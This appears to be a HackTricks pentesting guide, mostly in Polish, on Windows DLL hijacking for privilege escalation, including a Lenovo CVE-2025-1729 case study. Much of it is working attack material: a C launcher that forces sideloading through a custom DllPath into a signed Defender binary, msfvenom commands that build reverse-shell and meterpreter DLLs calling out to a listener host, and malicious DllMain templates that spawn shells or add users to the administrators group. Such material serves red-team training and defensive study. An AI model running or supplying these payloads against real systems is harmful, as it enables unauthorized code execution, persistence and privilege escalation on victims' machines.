# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji, aby załadowała złośliwy DLL. Termin ten obejmuje kilka taktyk takich jak **DLL Spoofing, Injection, and Side-Loading**. Metoda ta jest wykorzystywana głównie do wykonania kodu, uzyskania persistence i, rzadziej, privilege escalation. Mimo że tutaj koncentrujemy się na eskalacji, sposób hijackingu pozostaje ten sam niezależnie od celu.

### Typowe techniki

Stosuje się kilka metod DLL hijackingu, z których skuteczność zależy od strategii ładowania DLL danej aplikacji:

1. **DLL Replacement**: Zamiana prawidłowego DLL na złośliwy, opcjonalnie używając DLL Proxying, aby zachować funkcjonalność oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL w ścieżce wyszukiwania przed prawidłowym DLL, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Stworzenie złośliwego DLL, który aplikacja załaduje, myśląc, że jest to brakujący wymagany DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Podmiana legalnego DLL na złośliwy odpowiednik w katalogu WinSxS, metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika razem ze skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

## Finding missing Dlls

Najpopularniejszym sposobem znalezienia brakujących DLL-ów w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) ze sysinternals i **ustawienie** **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

oraz pokazanie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących dlli ogólnie**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującego dll-a w konkretnym pliku wykonywalnym**, powinieneś dodać dodatkowy filtr typu "Process Name" "contains" "\<exec name>", uruchomić go i zatrzymać przechwytywanie zdarzeń.

## Exploiting Missing Dlls

Aby eskalować uprawnienia, najlepszą szansą jest możliwość **zapisania dll-a, który proces działający z wyższymi uprawnieniami spróbuje załadować**, w jednym z miejsc, gdzie będzie on przeszukiwany. W efekcie będziemy mogli **zapisac** dll w **folderze**, który jest przeszukiwany wcześniej niż folder zawierający **oryginalny dll** (rzadki przypadek), lub zapisać go w folderze, w którym dll będzie wyszukiwany, podczas gdy oryginalny dll nie istnieje w żadnym z folderów.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Aplikacje Windows przeszukują DLL-e, podążając za zestawem **zdefiniowanych ścieżek wyszukiwania**, stosując określoną kolejność. Problem DLL hijackingu pojawia się, gdy złośliwy DLL zostanie strategicznie umieszczony w jednym z tych katalogów, tak że zostanie załadowany przed oryginalnym DLL. Rozwiązaniem zapobiegającym temu jest upewnienie się, że aplikacja używa ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL-i.

Poniżej możesz zobaczyć **kolejność wyszukiwania DLL na systemach 32-bitowych**:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To jest **domyślna** kolejność wyszukiwania z włączonym **SafeDllSearchMode**. Gdy jest wyłączony, katalog bieżący awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, warto zauważyć, że **dll może być załadowany wskazując ścieżkę bezwzględną zamiast samej nazwy**. W takim przypadku dll będzie **wyszukiwany tylko w tej ścieżce** (jeśli dll ma jakieś zależności, będą one wyszukiwane jako załadowane po nazwie).

Istnieją inne sposoby zmiany kolejności wyszukiwania, ale nie będę ich tu wyjaśniać.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Dostarczając tu katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowany DLL po nazwie (bez ścieżki bezwzględnej i bez użycia flag bezpiecznego ładowania), może zostać zmuszony do załadowania złośliwego DLL z tego katalogu.

Kluczowy pomysł
- Zbuduj parametry procesu przy użyciu RtlCreateProcessParametersEx i podaj własny DllPath wskazujący na katalog kontrolowany przez Ciebie (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy docelowy binarny rozwiąże DLL po nazwie, loader skonsultuje się z dostarczonym DllPath podczas rozwiązywania, umożliwiając powtarzalne sideloading nawet wtedy, gdy złośliwy DLL nie znajduje się obok docelowego EXE.

Notatki/ograniczenia
- To wpływa na tworzony proces potomny; różni się to od SetDllDirectory, które wpływa tylko na bieżący proces.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zhardkodowane ścieżki bezwzględne nie mogą być hijackowane. Forwarded exports i SxS mogą zmieniać priorytety.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub działający jako proxy do prawdziwego) w katalogu DllPath.
- Uruchom podpisany binarny plik wykonywalny, o którym wiadomo, że wyszukuje xmllite.dll po nazwie przy użyciu powyższej techniki. Loader rozwiązuje import za pomocą dostarczonego DllPath i sideloaduje twoją DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Zidentyfikuj proces, który działa lub będzie działał z **różnymi uprawnieniami** (ruch horyzontalny lub lateralny), który **nie ma DLL**.
- Upewnij się, że dostępne są **uprawnienia do zapisu** dla dowolnego **katalogu**, w którym **DLL** będzie **wyszukiwany**. Lokalizacją tą może być katalog wykonywalnego pliku lub katalog w ścieżce systemowej.

Tak, wymogi są trudne do znalezienia, ponieważ **domyślnie trudno jest znaleźć uprzywilejowany plik wykonywalny, któremu brakuje DLL** i jeszcze **dziwniejsze jest posiadanie uprawnień zapisu w folderze ścieżki systemowej** (domyślnie nie możesz). Ale, w źle skonfigurowanych środowiskach jest to możliwe.\
W przypadku, gdy masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest obejście UAC**, możesz tam znaleźć **PoC** Dll hijacking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia zapisu).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić importy pliku wykonywalnego i eksporty dll za pomocą:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik, jak **wykorzystać Dll Hijacking do eskalacji uprawnień** mając uprawnienia do zapisu w **folderze System Path**, sprawdź:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w system PATH.\
Inne interesujące zautomatyzowane narzędzia do wykrywania tej podatności to **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Przykład

Jeśli znajdziesz scenariusz możliwy do wykorzystania, jedną z najważniejszych rzeczy, aby go pomyślnie wykorzystać, będzie **stworzenie dll, która eksportuje przynajmniej wszystkie funkcje, które program będzie z niej importował**. Zwróć uwagę, że Dll Hijacking jest przydatny do [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Możesz znaleźć przykład **how to create a valid dll** w tym studium dll hijacking skoncentrowanym na dll hijacking dla wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do stworzenia **dll z wyeksportowanymi funkcjami, które nie są wymagane**.

## **Tworzenie i kompilowanie Dll**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolna do **wykonywania twojego złośliwego kodu po załadowaniu**, ale także do **eksponowania** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz w praktyce **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proxify i **wygenerować proxified dll** lub **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twoje własne

Zauważ, że w kilku przypadkach Dll, który kompilujesz, musi **export several functions**, które zostaną załadowane przez victim process; jeśli te funkcje nie istnieją, **binary won't be able to load** ich, a **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Studium przypadku: CVE-2025-1729 - Privilege Escalation przy użyciu TPQMAssistant.exe

Ten przypadek demonstruje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), oznaczony jako **CVE-2025-1729**.

### Szczegóły podatności

- **Składnik**: `TPQMAssistant.exe` zlokalizowany w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zaplanowane zadanie**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 i działa w kontekście zalogowanego użytkownika.
- **Uprawnienia katalogu**: Zapisywalne przez `CREATOR OWNER`, co pozwala lokalnym użytkownikom na umieszczanie dowolnych plików.
- **Zachowanie wyszukiwania DLL**: Próbuje załadować `hostfxr.dll` najpierw z katalogu roboczego i loguje "NAME NOT FOUND" jeśli plik nie istnieje, co wskazuje na priorytet wyszukiwania w lokalnym katalogu.

### Implementacja exploita

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik, umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany podczas wykonywania zadania, złośliwy DLL uruchomi się w sesji administratora na medium integrity.
4. Połącz standardowe techniki obejścia UAC, aby podnieść uprawnienia z medium integrity do SYSTEM.

### Środki zaradcze

Lenovo wydało wersję UWP **1.12.54.0** przez Microsoft Store, która instaluje TPQMAssistant w `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, usuwa podatne zaplanowane zadanie i odinstalowuje starsze komponenty Win32.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
